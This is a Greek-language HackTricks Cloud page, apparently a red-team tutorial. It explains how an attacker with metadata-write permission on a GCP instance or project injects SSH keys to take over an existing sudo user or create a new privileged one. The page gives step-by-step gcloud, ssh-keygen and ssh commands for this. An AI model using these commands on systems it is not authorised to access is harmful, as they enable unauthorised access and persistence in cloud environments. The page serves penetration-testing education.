# GCP - Προσθήκη Προσαρμοσμένων Μεταδεδομένων SSH

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Συμμετέχετε** 💬 στην [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγράφου**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Κοινοποιήστε κόλπα χάκερ υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>
{% endhint %}

## Τροποποίηση των μεταδεδομένων <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

Η τροποποίηση των μεταδεδομένων σε μια μονάδα μπορεί να οδηγήσει σε **σημαντικούς κινδύνους ασφαλείας εάν ένας εισβολέας αποκτήσει τις απαραίτητες άδειες**.

### **Ενσωμάτωση Κλειδιών SSH στα Προσαρμοσμένα Μεταδεδομένα**

Στο GCP, **τα συστήματα Linux** συχνά εκτελούν σενάρια από το [Python Linux Guest Environment for Google Compute Engine](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts). Ένα κρίσιμο στοιχείο αυτού είναι το [accounts daemon](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts), το οποίο είναι σχεδιασμένο να **ελέγχει τακτικά** το σημείο των μεταδεδομένων της μονάδας για **ενημερώσεις στα εξουσιοδοτημένα δημόσια κλειδιά SSH**.

Συνεπώς, εάν ένας εισβολέας μπορεί να τροποποιήσει τα προσαρμοσμένα μεταδεδομένα, μπορεί να κάνει τον δαίμονα να βρει ένα νέο δημόσιο κλειδί, το οποίο θα επεξεργαστεί και **θα ενσωματωθεί στο τοπικό σύστημα**. Το κλειδί θα προστεθεί στο αρχείο `~/.ssh/authorized_keys` ενός **υπάρχοντος χρήστη ή ενδεχομένως δημιουργώντας ένα νέο χρήστη με δικαιώματα `sudo`**, ανάλογα με τη μορφή του κλειδιού. Και ο εισβολέας θα μπορεί να διακινδυνεύσει τον υπολογιστή.

### **Προσθήκη κλειδιού SSH σε υπάρχον προνομιούχο χρήστη**

1. **Εξέταση των Υπαρχόντων Κλειδιών SSH στη Μονάδα:**
- Εκτελέστε την εντολή για να περιγράψετε τη μονάδα και τα μεταδεδομένα της για να εντοπίσετε τα υπάρχοντα κλειδιά SSH. Η σχετική ενότητα στην έξοδο θα βρίσκεται υπό τα `metadata`, ειδικά το κλειδί `ssh-keys`.
```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```
- Προσέξτε τη μορφή των κλειδιών SSH: το όνομα χρήστη προηγείται του κλειδιού, χωρίζονται με ένα άνω και κάτω τελεία.

2. **Προετοιμασία Αρχείου Κειμένου για τα Κλειδιά SSH:**
- Αποθηκεύστε τις λεπτομέρειες των ονομάτων χρηστών και των αντίστοιχων κλειδιών SSH τους σε ένα αρχείο κειμένου με το όνομα `meta.txt`. Αυτό είναι απαραίτητο για τη διατήρηση των υπαρχόντων κλειδιών καθώς προσθέτετε νέα.

3. **Δημιουργία Νέου Κλειδιού SSH για τον Στόχο Χρήστη (`alice` σε αυτό το παράδειγμα):**
- Χρησιμοποιήστε την εντολή `ssh-keygen` για να δημιουργήσετε ένα νέο κλειδί SSH, εξασφαλίζοντας ότι το πεδίο σχολίου (`-C`) ταιριάζει με το όνομα χρήστη στόχο.
```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
- Προσθέστε το νέο δημόσιο κλειδί στο `meta.txt`, μιμούμενοι τη μορφή που βρέθηκε στα μεταδεδομένα της μονάδας.

4. **Ενημέρωση των Μεταδεδομένων Κλειδιών SSH της Μονάδας:**
- Εφαρμόστε τα ενημερωμένα μεταδεδομένα κλειδιών SSH στη μονάδα χρησιμοποιώντας την εντολή `gcloud compute instances add-metadata`.
```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```

5. **Πρόσβαση στη Μονάδα Χρησιμοποιώντας το Νέο Κλειδί SSH:**
- Συνδεθείτε στη μονάδα με SSH χρησιμοποιώντας το νέο κλειδί, έχοντας πρόσβαση στο κέλυφος στο πλαίσιο του χρήστη στόχου (`alice` σε αυτό το παράδειγμα).
```bash
ssh -i ./key alice@localhost
sudo id
```

### **Δημιουργία νέου προνομιούχου χρήστη και προσθήκη ενός κλειδιού SSH**

Αν δεν βρεθεί κάποιος ενδιαφέρων χρήστης, είναι δυνατό να δημιουργηθεί ένας νέος στον οποίο θα δοθούν προνόμια `sudo`:
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
### Κλειδιά SSH στο επίπεδο έργου <a href="#sshing-around" id="sshing-around"></a>

Είναι δυνατόν να επεκτείνετε την πρόσβαση SSH σε πολλές Εικονικές Μηχανές (VMs) σε ένα περιβάλλον στον νέφος εφαρμόζοντας **κλειδιά SSH στο επίπεδο έργου**. Αυτή η προσέγγιση επιτρέπει την πρόσβαση SSH σε οποιαδήποτε έκδοση εντός του έργου που δεν έχει αποκλείσει ρητά τα κλειδιά SSH σε επίπεδο έργου. Εδώ υπάρχει μια περιληπτική οδηγία:

1. **Εφαρμογή Κλειδιών SSH στο Επίπεδο Έργου:**
- Χρησιμοποιήστε την εντολή `gcloud compute project-info add-metadata` για να προσθέσετε τα κλειδιά SSH από το `meta.txt` στα μεταδεδομένα του έργου. Αυτή η ενέργεια εξασφαλίζει ότι τα κλειδιά SSH αναγνωρίζονται σε όλες τις VMs στο έργο, εκτός αν μια VM έχει ενεργοποιημένη την επιλογή "Αποκλεισμός κλειδιών SSH σε επίπεδο έργου".
```bash
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```

2. **Σύνδεση σε Παραδείγματα Χρησιμοποιώντας Κλειδιά Σε Επίπεδο Έργου:**
- Με τα κλειδιά SSH σε επίπεδο έργου στη θέση τους, μπορείτε να συνδεθείτε μέσω SSH σε οποιαδήποτε έκδοση εντός του έργου. Οι έκδοση που δεν αποκλείει τα κλειδιά SSH σε επίπεδο έργου θα δεχτούν το κλειδί SSH, παρέχοντας πρόσβαση.
- Ένας άμεσος τρόπος για να συνδεθείτε μέσω SSH σε μια έκδοση είναι χρησιμοποιώντας την εντολή `gcloud compute ssh [INSTANCE]`. Αυτή η εντολή χρησιμοποιεί το τρέχον όνομά χρήστη σας και τα κλειδιά SSH που έχουν οριστεί σε επίπεδο έργου για να προσπαθήσει την πρόσβαση.
